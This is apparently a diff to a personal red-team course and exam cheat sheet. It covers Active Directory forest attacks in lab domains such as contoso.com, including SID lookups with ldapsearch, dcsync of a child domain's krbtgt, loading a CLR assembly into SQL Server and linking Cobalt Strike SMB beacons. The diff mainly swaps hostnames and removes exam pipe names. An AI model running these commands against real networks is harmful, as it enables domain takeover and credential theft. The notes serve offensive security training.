@@ -196,7 +196,7 @@ ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberO
 ```
 >Obtain the domain SID for the child domain in the forest.
 ```
-ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
+ldapsearch (objectClass=domain) --hostname lon-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
 ```
 >Obtain the SID for parent domain's Enterprise Admins group.  
 ```
@@ -612,12 +612,10 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 >Pipe name is set STATICALLY in Cobalt Strike GUI — Listeners > SMB listener > Pipename (C2) field. NOT set by `post-ex { set pipename }` in the Malleable C2 profile (that controls fork-and-run post-ex pipes only — completely separate).  
 >Run `link` from the SQL user beacon only, not from any impersonated session — needs a valid TGT in session to auto-request CIFS ticket.  
 >Lab default pipe name (original course value): `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337`  
->Exam2 custom pipe name (set in GUI SMB listener): `dotnet-diagnost-6845-ceeb-b00b-63676827406`  
 ```cs
 // LAB (London SQL)
 link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
-// EXAM2 (Dublin SQL) — use your configured SMB listener pipe name
-link dub-sql-1 dotnet-diagnost-6845-ceeb-b00b-63676827406
+
 ```
 >Show all SQL linked servers configured on lon-db-1
 ```cs
@@ -770,7 +768,7 @@ ls \\\\par-jmp-1.partner.com\\c$
 >Parent Child Trusts
 ```
 ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
-ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
+
 ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
 
 dcsync dublin.contoso.com DUBLIN\krbtgt
@@ -856,7 +854,6 @@ C:\Payloads\smb_x64.xthread.bin
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
 
 link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
-// EXAM2: link dub-sql-1 dotnet-diagnost-6845-ceeb-b00b-63676827406
 
 sql-disableclr lon-db-1
 
